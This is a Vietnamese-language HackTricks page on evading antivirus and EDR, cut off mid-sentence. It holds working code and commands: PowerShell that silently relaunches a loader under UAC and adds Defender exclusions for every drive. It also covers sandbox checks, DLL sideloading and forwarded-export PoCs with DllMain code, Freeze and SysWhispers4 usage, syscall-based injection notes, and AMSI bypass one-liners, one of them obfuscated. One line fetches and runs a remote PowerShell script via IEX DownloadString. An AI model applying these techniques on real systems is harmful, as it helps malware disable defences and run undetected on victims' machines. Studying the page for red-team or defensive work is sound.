# Bypass Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Trang này ban đầu được viết bởi** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Dừng Defender

- [defendnot](https://github.com/es3n1n/defendnot): Công cụ ngăn Windows Defender hoạt động.
- [no-defender](https://github.com/es3n1n/no-defender): Công cụ ngăn Windows Defender hoạt động bằng cách giả mạo một AV khác.
- [Vô hiệu hóa Defender nếu bạn là admin](basic-powershell-for-pentesters/README.md)

### Dụ người dùng chấp thuận UAC kiểu trình cài đặt trước khi can thiệp vào Defender

Các loader công khai giả dạng cheat game thường được phân phối dưới dạng trình cài đặt Node.js/Nexe chưa ký, trước tiên **yêu cầu người dùng cấp quyền nâng cao**, rồi mới vô hiệu hóa Defender. Quy trình rất đơn giản:

1. Kiểm tra xem có quyền admin hay không bằng `net session`. Lệnh này chỉ thành công khi tiến trình gọi có quyền admin, vì vậy nếu thất bại thì loader đang chạy dưới quyền người dùng thông thường.
2. Ngay lập tức khởi chạy lại chính nó bằng verb `RunAs` để kích hoạt lời nhắc chấp thuận UAC như dự kiến, đồng thời giữ nguyên dòng lệnh ban đầu.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Nạn nhân vốn đã tin rằng họ đang cài phần mềm “cracked”, nên thường chấp nhận lời nhắc, cấp cho malware các quyền cần thiết để thay đổi chính sách của Defender.<sup>[[26]](#references)</sup>

### Các ngoại lệ `MpPreference` bao trùm mọi ký tự ổ đĩa

Sau khi được nâng quyền, các chuỗi kiểu GachiLoader mở rộng tối đa những điểm mù của Defender thay vì tắt hẳn dịch vụ. Trước tiên, loader tắt tiến trình giám sát GUI (`taskkill /F /IM SecHealthUI.exe`), rồi thêm **các ngoại lệ cực kỳ rộng** để mọi hồ sơ người dùng, thư mục hệ thống và ổ đĩa di động đều không thể bị quét:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Các quan sát chính:

- Vòng lặp duyệt qua mọi filesystem đã mount (D:\, E:\, USB, v.v.), vì vậy **mọi payload được thả ở bất kỳ đâu trên ổ đĩa sau này đều bị bỏ qua**.
- Việc loại trừ phần mở rộng `.sys` nhằm phục vụ tương lai — kẻ tấn công giữ lại lựa chọn tải driver chưa ký sau này mà không cần động đến Defender lần nữa.
- Mọi thay đổi đều nằm trong `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, cho phép các giai đoạn sau xác nhận các mục loại trừ vẫn còn hoặc mở rộng chúng mà không kích hoạt lại UAC.

Vì không có dịch vụ Defender nào bị dừng, các bước kiểm tra tình trạng đơn giản vẫn báo “antivirus active”, dù tính năng kiểm tra theo thời gian thực không bao giờ quét các đường dẫn đó.<sup>[[26]](#references)</sup>

## **Phương pháp luận AV Evasion**

Hiện nay, AV sử dụng nhiều phương pháp khác nhau để kiểm tra xem một file có độc hại hay không: phát hiện tĩnh, phân tích động và, với các EDR tiên tiến hơn, phân tích hành vi.

### **Phát hiện tĩnh**

Phát hiện tĩnh được thực hiện bằng cách đánh dấu các chuỗi hoặc mảng byte độc hại đã biết trong binary hoặc script, đồng thời trích xuất thông tin từ chính file đó (ví dụ: mô tả file, tên công ty, chữ ký số, icon, checksum, v.v.). Điều này có nghĩa là sử dụng các công cụ công khai đã biết có thể khiến bạn dễ bị phát hiện hơn, vì chúng có thể đã được phân tích và đánh dấu là độc hại. Có một số cách để tránh kiểu phát hiện này:

- **Mã hóa**

Nếu bạn mã hóa binary, AV sẽ không thể phát hiện chương trình của bạn, nhưng bạn sẽ cần một dạng loader để giải mã và chạy chương trình trong bộ nhớ.

- **Làm rối mã**

Đôi khi, chỉ cần thay đổi một số chuỗi trong binary hoặc script là đủ để vượt qua AV, nhưng việc này có thể tốn thời gian tùy thuộc vào nội dung bạn đang cố làm rối.

- **Công cụ tự phát triển**

Nếu bạn tự phát triển công cụ, sẽ không có chữ ký độc hại đã biết, nhưng việc này tốn nhiều thời gian và công sức.

> [!TIP]
> Một cách tốt để kiểm tra khả năng phát hiện tĩnh của Windows Defender là dùng [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Công cụ này chia file thành nhiều đoạn rồi yêu cầu Defender quét riêng từng đoạn, nhờ đó có thể cho bạn biết chính xác những chuỗi hoặc byte nào trong binary bị đánh dấu.

Tôi thực sự khuyên bạn xem [playlist YouTube này](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) về AV Evasion thực tiễn.

### Kiểm thử đặc trưng PE ngoại tuyến cho bộ phân loại tĩnh

Các byte payload đã đóng gói hoặc mã hóa chỉ là một trong những đầu vào của bộ phân loại tĩnh. EMBER2024 trích xuất các đặc trưng PE, bao gồm imports, exports, sections, headers và dữ liệu Authenticode.<sup>[[48]](#references)</sup> Trong một thử nghiệm với loader, việc thêm 141 imports trông có vẻ lành tính đã giảm 93% điểm độc hại của EMBER2024, trong khi các imports gắn với malware làm tăng điểm này. Đây là kết quả trên mô hình và các mẫu đó, không phải cách đáng tin cậy để vượt qua một sản phẩm AV/EDR cụ thể.<sup>[[50]](#references)</sup>

Để kiểm thử loader được cấp phép, hãy giữ nguyên payload và đường dẫn thực thi, thay đổi một biến build dự định cho mỗi phiên bản, rồi so sánh điểm ngoại tuyến. Kiểm tra các đặc trưng PE thu được vì một thay đổi trong quá trình build có thể ảnh hưởng đến nhiều nhóm đặc trưng.<sup>[[49]](#references)[[50]](#references)</sup> Để giữ các imports dự định trong IAT, hãy gọi các Win32 API đã chọn từ code có thể được thực thi. Thay đổi lựa chọn và phân bố các vị trí gọi qua nhiều bản build thay vì tạo một hàm ngụy trang cố định có thể trở thành chữ ký. Thử nghiệm cũng ghi nhận điểm thấp hơn khi có code signing hợp lệ, export entries và nhiều functions hơn làm tăng kích thước `.pdata`; ký không hợp lệ ít ảnh hưởng, còn tác động của `.pdata` là nhỏ.<sup>[[50]](#references)</sup>

Package `thrember` cung cấp khả năng trích xuất đặc trưng và các mô hình benchmark. Sau khi cài đặt, hãy dùng `thrember.download_models("models")` với thư mục `models` đã tồn tại, rồi chạy bộ chấm điểm từ thư mục cha: hàm tải xuống sẽ thay đổi thư mục làm việc hiện tại. Bộ phân loại PE có thể chấm điểm một thư mục chứa các bản build mà không cần gửi chúng đến dịch vụ quét:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Giữ cố định phiên bản model và feature extractor trong quá trình so sánh. Điểm offline thấp hơn chỉ cho thấy classifier này phản ứng thế nào với binary đã thay đổi; điều đó không chứng minh được khả năng né tránh behavioral analysis, emulation hoặc model khác của nhà cung cấp.<sup>[[49]](#references)[[50]](#references)</sup> Để tìm hiểu về [per-build polymorphism và outer-binary camouflage trong virtualized payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), hãy xem execution model riêng.

### **Phân tích động**

Phân tích động là khi AV chạy binary của bạn trong sandbox và theo dõi hoạt động độc hại (ví dụ: cố giải mã và đọc mật khẩu trình duyệt, thực hiện minidump LSASS, v.v.). Phần này có thể hơi khó xử lý hơn, nhưng dưới đây là một số cách bạn có thể dùng để né sandbox.

- **Chờ trước khi thực thi** Tùy cách triển khai, đây có thể là một cách tuyệt vời để bypass phân tích động của AV. AV có rất ít thời gian để quét file nhằm tránh làm gián đoạn quy trình làm việc của người dùng, vì vậy, thời gian chờ dài có thể cản trở quá trình phân tích binary. Vấn đề là nhiều sandbox của AV có thể bỏ qua thời gian chờ, tùy cách triển khai.
- **Kiểm tra tài nguyên của máy** Sandbox thường có rất ít tài nguyên để sử dụng (ví dụ: < 2GB RAM), nếu không chúng có thể làm chậm máy của người dùng. Bạn cũng có thể sáng tạo hơn, chẳng hạn kiểm tra nhiệt độ CPU hoặc thậm chí tốc độ quạt; sandbox không triển khai được mọi thứ.
- **Kiểm tra thông tin riêng của máy** Nếu muốn nhắm đến người dùng có workstation tham gia domain "contoso.local", bạn có thể kiểm tra domain của máy tính để xem có khớp với domain đã chỉ định hay không; nếu không khớp, bạn có thể cho chương trình thoát.

Hóa ra computername của máy trong Microsoft Defender Sandbox là HAL9TH, vì vậy bạn có thể kiểm tra tên máy tính trong malware trước khi detonation. Nếu tên khớp với HAL9TH, nghĩa là bạn đang ở trong sandbox của Defender và có thể cho chương trình thoát.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>nguồn: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Một số mẹo hữu ích khác từ [@mgeeky](https://twitter.com/mariuszbit) để đối phó với Sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kênh #malware-dev</p></figcaption></figure>

Như chúng tôi đã nói trước đó trong bài viết này, **các công cụ công khai** sớm muộn cũng **bị phát hiện**, vì vậy bạn nên tự hỏi điều này:

Ví dụ, nếu muốn dump LSASS, **bạn có thực sự cần dùng mimikatz không**? Hay bạn có thể dùng một project khác ít được biết đến hơn nhưng cũng dump được LSASS?

Câu trả lời đúng có lẽ là phương án sau. Lấy mimikatz làm ví dụ, đây có lẽ là một trong những malware, nếu không muốn nói là malware bị AV và EDR đánh dấu nhiều nhất. Bản thân project này rất tuyệt, nhưng cũng là một cơn ác mộng khi tìm cách né AV, vì vậy hãy tìm các giải pháp thay thế để đạt được mục tiêu của bạn.

> [!TIP]
> Khi sửa đổi payload để né phát hiện, hãy nhớ **tắt tính năng tự động gửi mẫu** trong Defender và, làm ơn, nghiêm túc đấy, **ĐỪNG TẢI LÊN VIRUSTOTAL** nếu mục tiêu của bạn là né phát hiện về lâu dài. Nếu muốn kiểm tra xem một AV cụ thể có phát hiện payload hay không, hãy cài AV đó trên VM, thử tắt tính năng tự động gửi mẫu rồi kiểm tra tại đó cho đến khi bạn hài lòng với kết quả.

## EXE và DLL

Bất cứ khi nào có thể, hãy luôn **ưu tiên dùng DLL để né phát hiện**. Theo kinh nghiệm của tôi, file DLL thường **ít bị phát hiện và phân tích hơn nhiều**, vì vậy đây là một mẹo rất đơn giản để tránh bị phát hiện trong một số trường hợp (dĩ nhiên, nếu payload của bạn có cách chạy dưới dạng DLL).

Như có thể thấy trong hình này, DLL Payload từ Havoc có tỷ lệ phát hiện là 4/26 trên antiscan.me, trong khi EXE payload có tỷ lệ phát hiện là 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>so sánh trên antiscan.me giữa Havoc EXE payload thông thường và Havoc DLL thông thường</p></figcaption></figure>

Tiếp theo, chúng tôi sẽ giới thiệu một số mẹo dùng với file DLL để ẩn mình tốt hơn nhiều.

## DLL Sideloading & Proxying

**DLL Sideloading** tận dụng thứ tự tìm kiếm DLL mà loader sử dụng bằng cách đặt ứng dụng nạn nhân và payload độc hại cạnh nhau.

Bạn có thể dùng [Siofra](https://github.com/Cybereason/siofra) và powershell script sau để tìm các chương trình dễ bị DLL Sideloading:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Lệnh này sẽ xuất danh sách các chương trình trong "C:\Program Files\\" có thể bị DLL hijacking và các file DLL mà chúng cố tải.

Tôi rất khuyến nghị bạn **tự tìm hiểu các chương trình có thể bị DLL Hijack/Sideload**, kỹ thuật này khá stealthy nếu thực hiện đúng cách, nhưng nếu dùng các chương trình DLL Sideload đã được công khai, bạn có thể dễ dàng bị phát hiện.

Chỉ đặt một DLL độc hại có tên mà chương trình mong đợi tải sẽ không khiến payload của bạn được tải, vì chương trình cần một số hàm cụ thể bên trong DLL đó. Để khắc phục vấn đề này, chúng ta sẽ dùng một kỹ thuật khác gọi là **DLL Proxying/Forwarding**.

**DLL Proxying** chuyển tiếp các lệnh gọi mà chương trình thực hiện từ DLL proxy (và độc hại) sang DLL gốc, nhờ đó duy trì chức năng của chương trình và cho phép thực thi payload của bạn.

Tôi sẽ sử dụng dự án [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) của [@flangvik](https://twitter.com/Flangvik/)

Đây là các bước tôi đã thực hiện:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Lệnh cuối cùng sẽ cung cấp cho chúng ta 2 tệp: một mẫu mã nguồn DLL và DLL gốc đã được đổi tên.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Đây là kết quả:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Cả shellcode (được mã hóa bằng [SGN](https://github.com/EgeBalci/sgn)) lẫn proxy DLL của chúng ta đều có tỷ lệ phát hiện 0/26 trên [antiscan.me](https://antiscan.me)! Tôi cho rằng như vậy là thành công.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Tôi **rất khuyến khích** bạn xem [VOD trên Twitch của S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) về DLL Sideloading và cả [video của ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) để tìm hiểu sâu hơn về những gì chúng ta đã thảo luận.

### Lạm dụng Forwarded Exports (ForwardSideLoading)

Các module Windows PE có thể export những hàm thực chất là "forwarder": thay vì trỏ đến mã lệnh, mục export chứa một chuỗi ASCII có dạng `TargetDll.TargetFunc`. Khi một caller phân giải export này, Windows loader sẽ:

- Tải `TargetDll` nếu module này chưa được tải
- Phân giải `TargetFunc` từ module đó

Các hành vi quan trọng cần nắm:
- Nếu `TargetDll` là KnownDLL, module này được cung cấp từ namespace KnownDLLs được bảo vệ (ví dụ: ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Nếu `TargetDll` không phải KnownDLL, thứ tự tìm kiếm DLL thông thường sẽ được dùng; trong đó có thư mục của module đang thực hiện việc forward.

Điều này tạo ra một primitive sideloading gián tiếp: tìm một DLL đã ký có export một hàm được forward đến tên module không phải KnownDLL, sau đó đặt DLL đã ký đó cùng thư mục với một DLL do attacker kiểm soát, có tên chính xác là tên module đích được forward. Khi hàm export được forward được gọi, loader sẽ phân giải forward và tải DLL của bạn từ cùng thư mục, thực thi DllMain của bạn.<sup>[[13]](#references)</sup>

Ví dụ được quan sát trên Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` không phải là KnownDLL, nên nó được phân giải theo thứ tự tìm kiếm thông thường.

PoC (sao chép-dán):
1) Sao chép DLL hệ thống đã ký vào một thư mục có thể ghi
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Đặt một `NCRYPTPROV.dll` độc hại trong cùng thư mục. Chỉ cần một `DllMain` tối giản để thực thi mã; bạn không cần triển khai hàm được chuyển tiếp để kích hoạt `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Kích hoạt chuyển tiếp bằng một LOLBin đã được ký:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Hành vi quan sát được:
- rundll32 (đã ký) tải `keyiso.dll` side-by-side (đã ký)
- Khi phân giải `KeyIsoSetAuditingInterface`, loader lần theo forward đến `NCRYPTPROV.SetAuditingInterface`
- Sau đó, loader tải `NCRYPTPROV.dll` từ `C:\test` và thực thi `DllMain` của nó
- Nếu `SetAuditingInterface` chưa được triển khai, bạn sẽ gặp lỗi "missing API" chỉ sau khi `DllMain` đã chạy

Mẹo săn tìm:
- Tập trung vào các export được forward mà module đích không phải là KnownDLL. Danh sách KnownDLL nằm trong `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Bạn có thể liệt kê các export được forward bằng các công cụ như:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Xem danh sách forwarder của Windows 11 để tìm các ứng viên: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ý tưởng phát hiện/phòng thủ:
- Theo dõi LOLBins (ví dụ: rundll32.exe) tải các DLL đã ký từ đường dẫn không thuộc hệ thống, sau đó tải các DLL không thuộc KnownDLLs có cùng tên cơ sở từ thư mục đó
- Cảnh báo về các chuỗi tiến trình/module như: `rundll32.exe` → `keyiso.dll` không thuộc hệ thống → `NCRYPTPROV.dll` trong các đường dẫn mà người dùng có thể ghi
- Thực thi các chính sách toàn vẹn mã (WDAC/AppLocker) và cấm quyền ghi+thực thi trong các thư mục ứng dụng

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze là bộ công cụ payload dùng để bypass EDR bằng tiến trình bị tạm dừng, direct syscalls và các phương thức thực thi thay thế`

Bạn có thể dùng Freeze để tải và thực thi shellcode một cách kín đáo.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion chỉ là trò chơi mèo vờn chuột; thứ hoạt động hôm nay có thể bị phát hiện vào ngày mai. Vì vậy, đừng bao giờ chỉ dựa vào một công cụ; nếu có thể, hãy thử kết hợp nhiều kỹ thuật evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR thường đặt **user-mode inline hooks** lên các syscall stub của `ntdll.dll`. Để vượt qua những hook đó, bạn có thể tạo các syscall stub **direct** hoặc **indirect** để nạp **SSN** (System Service Number) phù hợp và chuyển sang kernel mode mà không thực thi entrypoint export đã bị hook.<sup>[[32]](#references)</sup>

**Các tùy chọn gọi:**
- **Direct (embedded)**: phát ra lệnh `syscall`/`sysenter`/`SVC #0` trong stub được tạo (không chạm đến export của `ntdll`).
- **Indirect**: nhảy vào một gadget `syscall` có sẵn bên trong `ntdll` để quá trình chuyển sang kernel trông như bắt nguồn từ `ntdll` (hữu ích cho việc né tránh heuristic); **randomized indirect** chọn một gadget từ một nhóm cho mỗi lần gọi.
- **Egg-hunt**: tránh nhúng chuỗi opcode tĩnh `0F 05` trên đĩa; tìm một chuỗi syscall tại runtime.

**Các chiến lược phân giải SSN chống hook:**
- **FreshyCalls (VA sort)**: suy ra SSN bằng cách sắp xếp các syscall stub theo địa chỉ ảo thay vì đọc byte của stub.
- **SyscallsFromDisk**: ánh xạ một `\KnownDlls\ntdll.dll` sạch, đọc SSN từ `.text` của nó, rồi hủy ánh xạ (vượt qua mọi hook trong bộ nhớ).
- **RecycledGate**: kết hợp suy luận SSN theo thứ tự VA với việc xác thực opcode khi stub còn sạch; nếu bị hook thì chuyển sang suy luận theo VA.
- **HW Breakpoint**: đặt DR0 trên lệnh `syscall` và dùng VEH để lấy SSN từ `EAX` tại runtime mà không cần phân tích byte đã bị hook.

Ví dụ cách dùng SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Khi phân tích các syscall export x64 sạch trong `ntdll` để tìm SSN, hãy chấp nhận cả `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) lẫn cùng chuỗi đó khi có tiền tố `F3 0F 1E FA` (`endbr64`). Trường hợp sau là một stub có tiền tố CET: parser giả định SSN luôn nằm ở một offset cố định sẽ bỏ sót nó. Nếu khởi tạo indirect-syscall thất bại và loader chuyển sang dùng `GetProcAddress`, các lệnh gọi thông qua những export này có thể lại gặp user-mode hook.<sup>[[54]](#references)</sup>

### Các syscall export thay thế trong `tprtdll.dll`

Dự án cho biết `tprtdll.dll` là một DLL được Microsoft ký, có mặt trong `C:\Windows\System32\` trên Windows 11 build 26100 trở lên. DLL này có các địa chỉ code riêng biệt so với `ntdll.dll`, vì vậy hook chỉ patch syscall entrypoint trong `ntdll` sẽ không patch stub `tprtdll` tương ứng. Khác với các phương pháp phân giải SSN ở trên, cách tiếp cận này nạp `tprtdll.dll` rồi gọi trực tiếp một export `Nt*` hoặc `Zw*` có sẵn thông qua `GetProcAddress`. Hãy kiểm tra DLL và các export cần thiết có tồn tại hay không, đồng thời sử dụng đúng prototype của hàm NT.<sup>[[55]](#references)</sup>

PoC self-injection dùng `tprtdll!NtAllocateVirtualMemoryEx` để cấp phát bộ nhớ RW, sao chép byte bằng `memcpy`, đổi vùng nhớ thành RX bằng `tprtdll!ZwProtectVirtualMemory` và tạo thread bằng `tprtdll!RtlCreateUserThread`.<sup>[[56]](#references)</sup> Biến thể cross-process cần một process handle tới process đích mà có thể truy cập được, đồng thời dùng `WriteProcessMemory` để sao chép dữ liệu.<sup>[[57]](#references)</sup> Danh mục export của dự án không có `NtOpenProcess`, `NtWriteVirtualMemory` và `NtCreateThreadEx`, vì vậy không phải mọi thao tác injection đều có thể dùng export thay thế.<sup>[[55]](#references)</sup>

PoC không chứng minh rằng `RtlCreateUserThread` là một direct syscall stub, hay các lời gọi nội bộ của nó tránh được hook trong `ntdll` chỉ vì export được phân giải từ `tprtdll`.<sup>[[56]](#references)</sup> Ví dụ cross-process cũng nhúng các địa chỉ `WinExec` và `ExitThread` được phân giải trong injector; các địa chỉ đó phải hợp lệ trong process đích thì payload của ví dụ mới hoạt động.<sup>[[57]](#references)</sup>

Cách này chỉ bypass các hook giới hạn trong những export `ntdll` tương ứng; nó không che giấu syscall khỏi hoạt động giám sát ở cấp kernel.<sup>[[55]](#references)</sup> Để xem một phương thức injection không dùng remote write và không tạo thread mới, xem [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## AMSI (Giao diện Quét Chống Phần mềm độc hại)

AMSI được tạo ra để ngăn chặn "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Ban đầu, AV chỉ có khả năng quét **các file trên ổ đĩa**, vì vậy nếu bạn có thể thực thi payload **trực tiếp trong bộ nhớ**, AV sẽ không thể làm gì để ngăn chặn, do không có đủ khả năng quan sát.

Tính năng AMSI được tích hợp vào các thành phần Windows sau:

- User Account Control, hay UAC (nâng quyền khi cài đặt EXE, COM, MSI hoặc ActiveX)
- PowerShell (script, sử dụng tương tác và đánh giá code động)
- Windows Script Host (wscript.exe và cscript.exe)
- JavaScript và VBScript
- Macro Office VBA

Tính năng này cho phép các giải pháp antivirus kiểm tra hành vi của script bằng cách hiển thị nội dung script ở dạng không mã hóa và không làm rối.

Chạy `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sẽ tạo cảnh báo sau trong Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Hãy chú ý cách nó thêm tiền tố `amsi:` rồi đến đường dẫn của executable đã chạy script; trong trường hợp này là powershell.exe.

Chúng ta không ghi file nào xuống ổ đĩa, nhưng vẫn bị phát hiện trong bộ nhớ do AMSI.

Ngoài ra, kể từ **.NET 4.8**, code C# cũng được chạy qua AMSI. Điều này thậm chí còn ảnh hưởng đến `Assembly.Load(byte[])` khi dùng để tải và thực thi trong bộ nhớ. Vì vậy, nếu muốn né AMSI khi thực thi trong bộ nhớ, nên dùng các phiên bản .NET cũ hơn (chẳng hạn 4.7.2 trở xuống).

Có một vài cách để vượt qua AMSI:

- **Làm rối code**

Vì AMSI chủ yếu hoạt động dựa trên phát hiện tĩnh, nên sửa đổi các script bạn định tải có thể là một cách tốt để né phát hiện.

Tuy nhiên, AMSI có khả năng gỡ rối script ngay cả khi script có nhiều lớp làm rối, vì vậy tùy vào cách thực hiện, làm rối code có thể là một lựa chọn không tốt. Điều này khiến việc né phát hiện không hề đơn giản. Dù vậy, đôi khi bạn chỉ cần đổi tên một vài biến là được; điều này tùy thuộc vào mức độ một nội dung đã bị gắn cờ.

- **AMSI Bypass**

Vì AMSI được triển khai bằng cách nạp một DLL vào process powershell (cũng như cscript.exe, wscript.exe, v.v.), nên có thể dễ dàng can thiệp vào nó ngay cả khi đang chạy với quyền người dùng không đặc quyền. Do lỗi trong cách triển khai AMSI này, các nhà nghiên cứu đã tìm ra nhiều cách để né quá trình quét AMSI.

**Buộc phát sinh lỗi**

Buộc quá trình khởi tạo AMSI thất bại (`amsiInitFailed`) sẽ khiến process hiện tại không thực hiện quét. Cách này ban đầu được [Matt Graeber](https://twitter.com/mattifestation) tiết lộ và Microsoft đã phát triển một signature để ngăn việc sử dụng rộng rãi hơn.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Chỉ cần một dòng powershell code là đủ để khiến AMSI không thể hoạt động trong tiến trình powershell hiện tại. Tất nhiên, chính dòng này đã bị AMSI phát hiện, nên cần chỉnh sửa một chút để sử dụng kỹ thuật này.

Đây là một AMSI bypass đã được chỉnh sửa mà tôi lấy từ [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Hãy nhớ rằng nội dung này có thể sẽ bị gắn cờ sau khi bài viết được đăng, vì vậy bạn không nên đăng bất kỳ đoạn code nào nếu mục tiêu là tránh bị phát hiện.

**Memory Patching**

Kỹ thuật này ban đầu được [@RastaMouse](https://twitter.com/_RastaMouse/) phát hiện. Kỹ thuật này tìm địa chỉ của hàm "AmsiScanBuffer" trong amsi.dll (chịu trách nhiệm quét dữ liệu đầu vào do người dùng cung cấp), rồi ghi đè hàm bằng các lệnh khiến hàm trả về mã E_INVALIDARG. Nhờ vậy, kết quả quét thực tế sẽ trả về 0, được hiểu là kết quả sạch.

> [!TIP]
> Hãy đọc [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) để xem giải thích chi tiết hơn.

Còn có nhiều kỹ thuật khác dùng để bypass AMSI bằng powershell. Hãy xem [**trang này**](basic-powershell-for-pentesters/index.html#amsi-bypass) và [**repo này**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) để tìm hiểu thêm.

### Chuyển hướng con trỏ quét AMSI COM thay vì patch `AmsiScanBuffer`

Một phương thức bypass chỉ tác động trong tiến trình, không đụng đến entry point `AmsiScanBuffer`. Trong loader .NET 64-bit được báo cáo, một đối tượng AMSI COM được tạo từ CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` trả về con trỏ interface, và slot vtable tại offset `0x18` được dùng làm đích gọi hàm quét. Loader patch một con trỏ native của `Console.Clear()` bằng một stub x64 ngắn, đổi mục vtable đó thành stub thông qua `VirtualProtect()`, rồi khôi phục quyền bảo vệ trang ban đầu. Yêu cầu tiên quyết là con trỏ 64-bit và bố cục COM như dự kiến; đây không phải offset dùng chung cho mọi interface AMSI hay mọi bản build. Các giai đoạn được quan sát trước đó là [nạp sidecar AppDomainManager đã ký](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) và [deserialization 